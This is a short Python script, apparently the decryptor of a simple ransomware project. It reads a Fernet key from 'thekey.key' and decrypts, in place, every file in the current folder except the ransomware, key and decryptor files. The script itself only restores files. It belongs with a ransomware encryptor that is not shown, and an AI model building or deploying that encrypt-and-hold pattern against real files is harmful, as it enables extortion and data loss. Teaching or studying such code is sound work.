import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "RansomWare.py" or file == "thekey.key" or file == "Decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("thekey.key",'rb') as thekey:
    key = thekey.read()
    
for file in files:
    with open(file, 'rb') as thefile:
        contents = thefile.read()
    contents_decrypted = Fernet(key).decrypt(contents)
    with open(file, 'wb') as thefile:
        thefile.write(contents_decrypted)